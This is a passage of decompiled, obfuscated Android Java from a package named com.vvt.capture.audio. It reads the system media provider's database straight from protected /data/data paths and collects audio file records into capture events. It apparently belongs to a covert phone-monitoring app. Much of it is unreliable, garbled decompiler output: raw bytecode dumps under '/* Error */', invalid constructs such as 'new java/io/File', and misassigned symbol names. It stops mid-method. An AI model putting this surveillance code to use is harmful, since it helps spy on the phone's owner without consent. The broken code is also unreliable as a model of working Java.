package com.vvt.capture.audio.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.io.d;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private static final File[] d;
  
  static
  {
    File[] arrayOfFile = new File[2];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.media/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.media/");
    arrayOfFile[1] = localFile;
    d = arrayOfFile;
  }
  
  public static String a()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "external";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = c;
      if (!bool2) {
        break label67;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label67:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public static ArrayList a(String paramString, List paramList1, List paramList2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (ArrayList)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = Long.valueOf(l);
        bool = paramList1.contains(localObject);
        if (!bool)
        {
          localObject = a(paramString, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
      bool = a;
      if (!bool) {}
    }
  }
  
  /* Error */
  public static List a(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: ldc 2
    //   6: astore_3
    //   7: aload_3
    //   8: monitorenter
    //   9: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   12: istore 4
    //   14: iload 4
    //   16: ifeq +3 -> 19
    //   19: new 57	java/util/ArrayList
    //   22: astore 5
    //   24: aload 5
    //   26: invokespecial 58	java/util/ArrayList:<init>	()V
    //   29: iconst_0
    //   30: istore 6
    //   32: aconst_null
    //   33: astore 7
    //   35: aload_0
    //   36: invokestatic 98	com/vvt/capture/audio/a/a:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   39: astore 8
    //   41: aload 8
    //   43: ifnull +27 -> 70
    //   46: aload 8
    //   48: invokevirtual 103	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   51: istore 9
    //   53: iload 9
    //   55: ifne +15 -> 70
    //   58: aload 8
    //   60: invokevirtual 106	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   63: istore 9
    //   65: iload 9
    //   67: ifeq +48 -> 115
    //   70: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   73: istore 9
    //   75: iload 9
    //   77: ifeq +3 -> 80
    //   80: aload 8
    //   82: ifnull +8 -> 90
    //   85: aload 8
    //   87: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   90: iconst_0
    //   91: ifeq +9 -> 100
    //   94: aconst_null
    //   95: invokeinterface 112 1 0
    //   100: aload 8
    //   102: ifnull +8 -> 110
    //   105: aload 8
    //   107: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   110: aload_3
    //   111: monitorexit
    //   112: aload 5
    //   114: areturn
    //   115: ldc 114
    //   117: astore 7
    //   119: iconst_3
    //   120: istore 9
    //   122: iload 9
    //   124: anewarray 4	java/lang/Object
    //   127: astore 10
    //   129: iconst_0
    //   130: istore 11
    //   132: ldc 117
    //   134: astore 12
    //   136: aload 10
    //   138: iconst_0
    //   139: aload 12
    //   141: aastore
    //   142: iconst_1
    //   143: istore 11
    //   145: ldc 119
    //   147: astore 12
    //   149: aload 10
    //   151: iload 11
    //   153: aload 12
    //   155: aastore
    //   156: iconst_2
    //   157: istore 11
    //   159: ldc 121
    //   161: astore 12
    //   163: aload 10
    //   165: iload 11
    //   167: aload 12
    //   169: aastore
    //   170: aload 7
    //   172: aload 10
    //   174: invokestatic 127	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   177: astore 7
    //   179: iconst_0
    //   180: istore 9
    //   182: aconst_null
    //   183: astore 10
    //   185: aload 8
    //   187: aload 7
    //   189: aconst_null
    //   190: invokevirtual 131	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   193: astore_2
    //   194: aload_2
    //   195: ifnull +111 -> 306
    //   198: aload_2
    //   199: invokeinterface 134 1 0
    //   204: istore 6
    //   206: iload 6
    //   208: ifeq +108 -> 316
    //   211: ldc 117
    //   213: astore 7
    //   215: aload_2
    //   216: aload 7
    //   218: invokeinterface 138 2 0
    //   223: istore 6
    //   225: aload_2
    //   226: iload 6
    //   228: invokeinterface 142 2 0
    //   233: lstore 13
    //   235: lload 13
    //   237: invokestatic 84	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   240: astore 7
    //   242: aload 5
    //   244: aload 7
    //   246: invokeinterface 145 2 0
    //   251: pop
    //   252: goto -54 -> 198
    //   255: astore 7
    //   257: getstatic 23	com/vvt/capture/audio/a/a:MyUncaughtExceptionHandler	Z
    //   260: istore 6
    //   262: iload 6
    //   264: ifeq +3 -> 267
    //   267: aload_2
    //   268: ifnull +9 -> 277
    //   271: aload_2
    //   272: invokeinterface 112 1 0
    //   277: aload 8
    //   279: ifnull +8 -> 287
    //   282: aload 8
    //   284: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   287: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   290: istore_1
    //   291: iload_1
    //   292: ifeq +3 -> 295
    //   295: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   298: istore_1
    //   299: iload_1
    //   300: ifeq -190 -> 110
    //   303: goto -193 -> 110
    //   306: getstatic 23	com/vvt/capture/audio/a/a:MyUncaughtExceptionHandler	Z
    //   309: istore 6
    //   311: iload 6
    //   313: ifeq +3 -> 316
    //   316: aload_2
    //   317: ifnull +9 -> 326
    //   320: aload_2
    //   321: invokeinterface 112 1 0
    //   326: aload 8
    //   328: ifnull -41 -> 287
    //   331: aload 8
    //   333: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   336: goto -49 -> 287
    //   339: astore 5
    //   341: aload_3
    //   342: monitorexit
    //   343: aload 5
    //   345: athrow
    //   346: astore 5
    //   348: aconst_null
    //   349: astore 8
    //   351: aload_2
    //   352: ifnull +9 -> 361
    //   355: aload_2
    //   356: invokeinterface 112 1 0
    //   361: aload 8
    //   363: ifnull +8 -> 371
    //   366: aload 8
    //   368: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   371: aload 5
    //   373: athrow
    //   374: astore 5
    //   376: goto -25 -> 351
    //   379: astore 8
    //   381: aconst_null
    //   382: astore 8
    //   384: goto -127 -> 257
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	387	0	paramString	String
    //   1	299	1	bool1	boolean
    //   3	353	2	localCursor	android.database.Cursor
    //   6	336	3	localClass	Class
    //   12	3	4	bool2	boolean
    //   22	221	5	localArrayList	ArrayList
    //   339	5	5	localObject1	Object
    //   346	26	5	localObject2	Object
    //   374	1	5	localObject3	Object
    //   30	177	6	bool3	boolean
    //   223	4	6	i	int
    //   260	52	6	bool4	boolean
    //   33	212	7	localObject4	Object
    //   255	1	7	localException1	Exception
    //   39	328	8	localSQLiteDatabase	SQLiteDatabase
    //   379	1	8	localException2	Exception
    //   382	1	8	localObject5	Object
    //   51	25	9	bool5	boolean
    //   120	61	9	j	int
    //   127	57	10	arrayOfObject	Object[]
    //   130	36	11	k	int
    //   134	34	12	str	String
    //   233	3	13	l	long
    // Exception table:
    //   from	to	target	type
    //   46	51	255	java/lang/Exception
    //   58	63	255	java/lang/Exception
    //   70	73	255	java/lang/Exception
    //   85	90	255	java/lang/Exception
    //   122	127	255	java/lang/Exception
    //   139	142	255	java/lang/Exception
    //   153	156	255	java/lang/Exception
    //   167	170	255	java/lang/Exception
    //   172	177	255	java/lang/Exception
    //   189	193	255	java/lang/Exception
    //   198	204	255	java/lang/Exception
    //   216	223	255	java/lang/Exception
    //   226	233	255	java/lang/Exception
    //   235	240	255	java/lang/Exception
    //   244	252	255	java/lang/Exception
    //   306	309	255	java/lang/Exception
    //   9	12	339	finally
    //   19	22	339	finally
    //   24	29	339	finally
    //   94	100	339	finally
    //   105	110	339	finally
    //   271	277	339	finally
    //   282	287	339	finally
    //   287	290	339	finally
    //   295	298	339	finally
    //   320	326	339	finally
    //   331	336	339	finally
    //   355	361	339	finally
    //   366	371	339	finally
    //   371	374	339	finally
    //   35	39	346	finally
    //   46	51	374	finally
    //   58	63	374	finally
    //   70	73	374	finally
    //   85	90	374	finally
    //   122	127	374	finally
    //   139	142	374	finally
    //   153	156	374	finally
    //   167	170	374	finally
    //   172	177	374	finally
    //   189	193	374	finally
    //   198	204	374	finally
    //   216	223	374	finally
    //   226	233	374	finally
    //   235	240	374	finally
    //   244	252	374	finally
    //   257	260	374	finally
    //   306	309	374	finally
    //   35	39	379	java/lang/Exception
  }
  
  /* Error */
  public static List a(String paramString, int paramInt)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: ldc 2
    //   6: astore 4
    //   8: aload 4
    //   10: monitorenter
    //   11: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   14: istore 5
    //   16: iload 5
    //   18: ifeq +3 -> 21
    //   21: new 57	java/util/ArrayList
    //   24: astore 6
    //   26: aload 6
    //   28: invokespecial 58	java/util/ArrayList:<init>	()V
    //   31: iconst_0
    //   32: istore 7
    //   34: aconst_null
    //   35: astore 8
    //   37: aload_0
    //   38: invokestatic 98	com/vvt/capture/audio/a/a:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 9
    //   43: aload 9
    //   45: ifnull +27 -> 72
    //   48: aload 9
    //   50: invokevirtual 103	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   53: istore 10
    //   55: iload 10
    //   57: ifne +15 -> 72
    //   60: aload 9
    //   62: invokevirtual 106	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   65: istore 10
    //   67: iload 10
    //   69: ifeq +49 -> 118
    //   72: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   75: istore 10
    //   77: iload 10
    //   79: ifeq +3 -> 82
    //   82: aload 9
    //   84: ifnull +8 -> 92
    //   87: aload 9
    //   89: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   92: iconst_0
    //   93: ifeq +9 -> 102
    //   96: aconst_null
    //   97: invokeinterface 112 1 0
    //   102: aload 9
    //   104: ifnull +8 -> 112
    //   107: aload 9
    //   109: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   112: aload 4
    //   114: monitorexit
    //   115: aload 6
    //   117: areturn
    //   118: iconst_m1
    //   119: istore 7
    //   121: iload_1
    //   122: iload 7
    //   124: if_icmpne +7 -> 131
    //   127: iconst_m1
    //   128: iconst_1
    //   129: iushr
    //   130: istore_1
    //   131: ldc -107
    //   133: astore 8
    //   135: iconst_5
    //   136: istore 10
    //   138: iload 10
    //   140: anewarray 4	java/lang/Object
    //   143: astore 11
    //   145: iconst_0
    //   146: istore 12
    //   148: ldc 117
    //   150: astore 13
    //   152: aload 11
    //   154: iconst_0
    //   155: aload 13
    //   157: aastore
    //   158: iconst_1
    //   159: istore 12
    //   161: ldc 119
    //   163: astore 13
    //   165: aload 11
    //   167: iload 12
    //   169: aload 13
    //   171: aastore
    //   172: iconst_2
    //   173: istore 12
    //   175: ldc 121
    //   177: astore 13
    //   179: aload 11
    //   181: iload 12
    //   183: aload 13
    //   185: aastore
    //   186: iconst_3
    //   187: istore 12
    //   189: ldc 117
    //   191: astore 13
    //   193: aload 11
    //   195: iload 12
    //   197: aload 13
    //   199: aastore
    //   200: iconst_4
    //   201: istore 12
    //   203: iload_1
    //   204: invokestatic 156	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   207: astore 13
    //   209: aload 11
    //   211: iload 12
    //   213: aload 13
    //   215: aastore
    //   216: aload 8
    //   218: aload 11
    //   220: invokestatic 127	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   223: astore 8
    //   225: iconst_0
    //   226: istore 10
    //   228: aconst_null
    //   229: astore 11
    //   231: aload 9
    //   233: aload 8
    //   235: aconst_null
    //   236: invokevirtual 131	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   239: astore_3
    //   240: aload_3
    //   241: ifnull +111 -> 352
    //   244: aload_3
    //   245: invokeinterface 134 1 0
    //   250: istore 7
    //   252: iload 7
    //   254: ifeq +108 -> 362
    //   257: ldc 117
    //   259: astore 8
    //   261: aload_3
    //   262: aload 8
    //   264: invokeinterface 138 2 0
    //   269: istore 7
    //   271: aload_3
    //   272: iload 7
    //   274: invokeinterface 142 2 0
    //   279: lstore 14
    //   281: lload 14
    //   283: invokestatic 84	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   286: astore 8
    //   288: aload 6
    //   290: aload 8
    //   292: invokeinterface 145 2 0
    //   297: pop
    //   298: goto -54 -> 244
    //   301: astore 8
    //   303: getstatic 23	com/vvt/capture/audio/a/a:MyUncaughtExceptionHandler	Z
    //   306: istore 7
    //   308: iload 7
    //   310: ifeq +3 -> 313
    //   313: aload_3
    //   314: ifnull +9 -> 323
    //   317: aload_3
    //   318: invokeinterface 112 1 0
    //   323: aload 9
    //   325: ifnull +8 -> 333
    //   328: aload 9
    //   330: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   333: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   336: istore_2
    //   337: iload_2
    //   338: ifeq +3 -> 341
    //   341: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   344: istore_2
    //   345: iload_2
    //   346: ifeq -234 -> 112
    //   349: goto -237 -> 112
    //   352: getstatic 23	com/vvt/capture/audio/a/a:MyUncaughtExceptionHandler	Z
    //   355: istore 7
    //   357: iload 7
    //   359: ifeq +3 -> 362
    //   362: aload_3
    //   363: ifnull +9 -> 372
    //   366: aload_3
    //   367: invokeinterface 112 1 0
    //   372: aload 9
    //   374: ifnull -41 -> 333
    //   377: aload 9
    //   379: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   382: goto -49 -> 333
    //   385: astore 6
    //   387: aload 4
    //   389: monitorexit
    //   390: aload 6
    //   392: athrow
    //   393: astore 6
    //   395: aconst_null
    //   396: astore 9
    //   398: aload_3
    //   399: ifnull +9 -> 408
    //   402: aload_3
    //   403: invokeinterface 112 1 0
    //   408: aload 9
    //   410: ifnull +8 -> 418
    //   413: aload 9
    //   415: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   418: aload 6
    //   420: athrow
    //   421: astore 6
    //   423: goto -25 -> 398
    //   426: astore 9
    //   428: aconst_null
    //   429: astore 9
    //   431: goto -128 -> 303
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	434	0	paramString	String
    //   0	434	1	paramInt	int
    //   1	345	2	bool1	boolean
    //   3	400	3	localCursor	android.database.Cursor
    //   6	382	4	localClass	Class
    //   14	3	5	bool2	boolean
    //   24	265	6	localArrayList	ArrayList
    //   385	6	6	localObject1	Object
    //   393	26	6	localObject2	Object
    //   421	1	6	localObject3	Object
    //   32	93	7	i	int
    //   250	3	7	bool3	boolean
    //   269	4	7	j	int
    //   306	52	7	bool4	boolean
    //   35	256	8	localObject4	Object
    //   301	1	8	localException1	Exception
    //   41	373	9	localSQLiteDatabase	SQLiteDatabase
    //   426	1	9	localException2	Exception
    //   429	1	9	localObject5	Object
    //   53	25	10	bool5	boolean
    //   136	91	10	k	int
    //   143	87	11	arrayOfObject	Object[]
    //   146	66	12	m	int
    //   150	64	13	str	String
    //   279	3	14	l	long
    // Exception table:
    //   from	to	target	type
    //   48	53	301	java/lang/Exception
    //   60	65	301	java/lang/Exception
    //   72	75	301	java/lang/Exception
    //   87	92	301	java/lang/Exception
    //   138	143	301	java/lang/Exception
    //   155	158	301	java/lang/Exception
    //   169	172	301	java/lang/Exception
    //   183	186	301	java/lang/Exception
    //   197	200	301	java/lang/Exception
    //   203	207	301	java/lang/Exception
    //   213	216	301	java/lang/Exception
    //   218	223	301	java/lang/Exception
    //   235	239	301	java/lang/Exception
    //   244	250	301	java/lang/Exception
    //   262	269	301	java/lang/Exception
    //   272	279	301	java/lang/Exception
    //   281	286	301	java/lang/Exception
    //   290	298	301	java/lang/Exception
    //   352	355	301	java/lang/Exception
    //   11	14	385	finally
    //   21	24	385	finally
    //   26	31	385	finally
    //   96	102	385	finally
    //   107	112	385	finally
    //   317	323	385	finally
    //   328	333	385	finally
    //   333	336	385	finally
    //   341	344	385	finally
    //   366	372	385	finally
    //   377	382	385	finally
    //   402	408	385	finally
    //   413	418	385	finally
    //   418	421	385	finally
    //   37	41	393	finally
    //   48	53	421	finally
    //   60	65	421	finally
    //   72	75	421	finally
    //   87	92	421	finally
    //   138	143	421	finally
    //   155	158	421	finally
    //   169	172	421	finally
    //   183	186	421	finally
    //   197	200	421	finally
    //   203	207	421	finally
    //   213	216	421	finally
    //   218	223	421	finally
    //   235	239	421	finally
    //   244	250	421	finally
    //   262	269	421	finally
    //   272	279	421	finally
    //   281	286	421	finally
    //   290	298	421	finally
    //   303	306	421	finally
    //   352	355	421	finally
    //   37	41	426	java/lang/Exception
  }
  
  /* Error */
  private static List a(String paramString, long paramLong)
  {
    // Byte code:
    //   0: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   11: istore_3
    //   12: iload_3
    //   13: ifeq +3 -> 16
    //   16: new 57	java/util/ArrayList
    //   19: astore 4
    //   21: aload 4
    //   23: invokespecial 58	java/util/ArrayList:<init>	()V
    //   26: ldc -98
    //   28: astore 5
    //   30: iconst_2
    //   31: anewarray 4	java/lang/Object
    //   34: astore 6
    //   36: aconst_null
    //   37: astore 7
    //   39: aload 6
    //   41: iconst_0
    //   42: ldc 117
    //   44: aastore
    //   45: iconst_1
    //   46: istore 8
    //   48: lload_1
    //   49: invokestatic 84	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   52: astore 9
    //   54: aload 6
    //   56: iload 8
    //   58: aload 9
    //   60: aastore
    //   61: aload 5
    //   63: aload 6
    //   65: invokestatic 127	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   68: astore 9
    //   70: iconst_0
    //   71: istore 10
    //   73: aconst_null
    //   74: astore 6
    //   76: iconst_0
    //   77: istore 11
    //   79: aconst_null
    //   80: astore 12
    //   82: aload_0
    //   83: invokestatic 98	com/vvt/capture/audio/a/a:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   86: astore 5
    //   88: ldc 121
    //   90: astore 6
    //   92: iconst_0
    //   93: istore 8
    //   95: aconst_null
    //   96: astore 7
    //   98: iconst_0
    //   99: istore 13
    //   101: aconst_null
    //   102: astore 14
    //   104: aconst_null
    //   105: astore 15
    //   107: aload 5
    //   109: aload 6
    //   111: aconst_null
    //   112: aload 9
    //   114: aconst_null
    //   115: aconst_null
    //   116: aconst_null
    //   117: aconst_null
    //   118: invokevirtual 162	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   121: astore 7
    //   123: aload 7
    //   125: ifnull +425 -> 550
    //   128: iconst_0
    //   129: istore 10
    //   131: aconst_null
    //   132: astore 6
    //   134: aload 7
    //   136: invokeinterface 134 1 0
    //   141: istore 16
    //   143: iload 16
    //   145: ifeq +415 -> 560
    //   148: ldc 117
    //   150: astore 9
    //   152: aload 7
    //   154: aload 9
    //   156: invokeinterface 165 2 0
    //   161: istore 16
    //   163: aload 7
    //   165: iload 16
    //   167: invokeinterface 169 2 0
    //   172: istore 13
    //   174: ldc 119
    //   176: astore 9
    //   178: aload 7
    //   180: aload 9
    //   182: invokeinterface 165 2 0
    //   187: istore 16
    //   189: aload 7
    //   191: iload 16
    //   193: invokeinterface 172 2 0
    //   198: astore 14
    //   200: ldc -82
    //   202: astore 9
    //   204: aload 7
    //   206: aload 9
    //   208: invokeinterface 165 2 0
    //   213: istore 16
    //   215: aload 7
    //   217: iload 16
    //   219: invokeinterface 172 2 0
    //   224: astore 9
    //   226: aload 9
    //   228: invokestatic 179	com/vvt/events/f:a	(Ljava/lang/String;)Lcom/vvt/events/FxMediaType;
    //   231: astore 15
    //   233: new 181	java/util/Date
    //   236: astore 9
    //   238: aload 9
    //   240: invokespecial 182	java/util/Date:<init>	()V
    //   243: aload 9
    //   245: invokevirtual 185	java/util/Date:getTime	()J
    //   248: lstore 17
    //   250: ldc -69
    //   252: astore 9
    //   254: aload 7
    //   256: aload 9
    //   258: invokeinterface 165 2 0
    //   263: istore 16
    //   265: aload 7
    //   267: iload 16
    //   269: invokeinterface 142 2 0
    //   274: lstore 19
    //   276: ldc -67
    //   278: astore 12
    //   280: aload 7
    //   282: aload 12
    //   284: invokeinterface 165 2 0
    //   289: istore 11
    //   291: aload 7
    //   293: iload 11
    //   295: invokeinterface 169 2 0
    //   300: istore 11
    //   302: aload 14
    //   304: invokestatic 193	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   307: astore 14
    //   309: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   312: istore 21
    //   314: iload 21
    //   316: ifeq +3 -> 319
    //   319: new 26	java/io/File
    //   322: astore 22
    //   324: aload 22
    //   326: aload 14
    //   328: invokespecial 32	java/io/File:<init>	(Ljava/lang/String;)V
    //   331: aload 22
    //   333: invokevirtual 196	java/io/File:exists	()Z
    //   336: istore 23
    //   338: iload 23
    //   340: ifeq +15 -> 355
    //   343: aload 22
    //   345: invokevirtual 199	java/io/File:canRead	()Z
    //   348: istore 21
    //   350: iload 21
    //   352: ifne +16 -> 368
    //   355: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   358: istore 16
    //   360: iload 16
    //   362: ifeq -228 -> 134
    //   365: goto -231 -> 134
    //   368: aload 14
    //   370: invokevirtual 202	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   373: astore 22
    //   375: ldc -52
    //   377: astore 24
    //   379: aload 22
    //   381: aload 24
    //   383: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   386: istore 21
    //   388: iload 21
    //   390: ifne -256 -> 134
    //   393: lconst_0
    //   394: lstore 25
    //   396: lload 19
    //   398: lload 25
    //   400: lcmp
    //   401: istore 21
    //   403: iload 21
    //   405: ifgt +22 -> 427
    //   408: new 26	java/io/File
    //   411: astore 9
    //   413: aload 9
    //   415: aload 14
    //   417: invokespecial 32	java/io/File:<init>	(Ljava/lang/String;)V
    //   420: aload 9
    //   422: invokevirtual 210	java/io/File:length	()J
    //   425: lstore 19
    //   427: new 212	com/vvt/capture/audio/MyUncaughtExceptionHandler
    //   430: astore 22
    //   432: aload 22
    //   434: invokespecial 213	com/vvt/capture/audio/MyUncaughtExceptionHandler:<init>	()V
    //   437: aload 22
    //   439: lload 17
    //   441: invokevirtual 216	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(J)V
    //   444: aload 22
    //   446: aload 15
    //   448: invokevirtual 219	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(Lcom/vvt/events/FxMediaType;)V
    //   451: iload 13
    //   453: i2l
    //   454: lstore 17
    //   456: aload 22
    //   458: lload 17
    //   460: invokevirtual 221	com/vvt/capture/audio/MyUncaughtExceptionHandler:removeFromPath	(J)V
    //   463: iload 11
    //   465: sipush 1000
    //   468: idiv
    //   469: istore 13
    //   471: aload 22
    //   473: iload 13
    //   475: invokevirtual 224	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(I)V
    //   478: aload 22
    //   480: aconst_null
    //   481: invokevirtual 227	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	([B)V
    //   484: aload 22
    //   486: lload 19
    //   488: invokevirtual 229	com/vvt/capture/audio/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(J)V
    //   491: aload 22
    //   493: aload 14
    //   495: invokevirtual 231	com/vvt/capture/audio/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   498: aload 4
    //   500: aload 22
    //   502: invokeinterface 145 2 0
    //   507: pop
    //   508: goto -374 -> 134
    //   511: astore 27
    //   513: aload 7
    //   515: astore 6
    //   517: aload 5
    //   519: astore 7
    //   521: aload 27
    //   523: astore 5
    //   525: aload 6
    //   527: ifnull +10 -> 537
    //   530: aload 6
    //   532: invokeinterface 112 1 0
    //   537: aload 7
    //   539: ifnull +8 -> 547
    //   542: aload 7
    //   544: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   547: aload 5
    //   549: athrow
    //   550: getstatic 23	com/vvt/capture/audio/a/a:MyUncaughtExceptionHandler	Z
    //   553: istore 10
    //   555: iload 10
    //   557: ifeq +3 -> 560
    //   560: aload 7
    //   562: ifnull +10 -> 572
    //   565: aload 7
    //   567: invokeinterface 112 1 0
    //   572: aload 5
    //   574: ifnull +8 -> 582
    //   577: aload 5
    //   579: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   582: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   585: istore_3
    //   586: iload_3
    //   587: ifeq +3 -> 590
    //   590: getstatic 15	com/vvt/capture/audio/a/a:a	Z
    //   593: istore_3
    //   594: iload_3
    //   595: ifeq +3 -> 598
    //   598: aload 4
    //   600: areturn
    //   601: astore 5
    //   603: iconst_0
    //   604: istore 8
    //   606: aconst_null
    //   607: astore 7
    //   609: iconst_0
    //   610: istore 10
    //   612: aconst_null
    //   613: astore 6
    //   615: goto -90 -> 525
    //   618: astore 6
    //   620: aload 5
    //   622: astore 7
    //   624: aload 6
    //   626: astore 5
    //   628: iconst_0
    //   629: istore 10
    //   631: aconst_null
    //   632: astore 6
    //   634: goto -109 -> 525
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	637	0	paramString	String
    //   0	637	1	paramLong	long
    //   3	592	3	bool1	boolean
    //   19	580	4	localArrayList	ArrayList
    //   28	550	5	localObject1	Object
    //   601	20	5	localObject2	Object
    //   626	1	5	localObject3	Object
    //   34	580	6	localObject4	Object
    //   618	7	6	localObject5	Object
    //   632	1	6	localObject6	Object
    //   37	586	7	localObject7	Object
    //   46	559	8	i	int
    //   52	369	9	localObject8	Object
    //   71	559	10	bool2	boolean
    //   77	392	11	j	int
    //   80	203	12	str1	String
    //   99	375	13	k	int
    //   102	392	14	str2	String
    //   105	342	15	localFxMediaType	com.vvt.events.FxMediaType
    //   141	3	16	bool3	boolean
    //   161	107	16	m	int
    //   358	3	16	bool4	boolean
    //   248	211	17	l1	long
    //   274	213	19	l2	long
    //   312	92	21	bool5	boolean
    //   322	179	22	localObject9	Object
    //   336	3	23	bool6	boolean
    //   377	5	24	str3	String
    //   394	5	25	l3	long
    //   511	11	27	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   134	141	511	finally
    //   154	161	511	finally
    //   165	172	511	finally
    //   180	187	511	finally
    //   191	198	511	finally
    //   206	213	511	finally
    //   217	224	511	finally
    //   226	231	511	finally
    //   233	236	511	finally
    //   238	243	511	finally
    //   243	248	511	finally
    //   256	263	511	finally
    //   267	274	511	finally
    //   282	289	511	finally
    //   293	300	511	finally
    //   302	307	511	finally
    //   309	312	511	finally
    //   319	322	511	finally
    //   326	331	511	finally
    //   331	336	511	finally
    //   343	348	511	finally
    //   355	358	511	finally
    //   368	373	511	finally
    //   381	386	511	finally
    //   408	411	511	finally
    //   415	420	511	finally
    //   420	425	511	finally
    //   427	430	511	finally
    //   432	437	511	finally
    //   439	444	511	finally
    //   446	451	511	finally
    //   458	463	511	finally
    //   465	469	511	finally
    //   473	478	511	finally
    //   480	484	511	finally
    //   486	491	511	finally
    //   493	498	511	finally
    //   500	508	511	finally
    //   550	553	511	finally
    //   82	86	601	finally
    //   117	121	618	finally
  }
  
  private static SQLiteDatabase b(String paramString)
  {
    return b(paramString, 17);
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = c(paramString, paramInt);
    int i = 5;
    while ((localSQLiteDatabase == null) && (i > 0))
    {
      boolean bool = a;
      if (bool) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = c(paramString, paramInt);
      i += -1;
    }
    return localSQLiteDatabase;
  }
  
  public static String b()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = d;
    String str1 = "internal";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
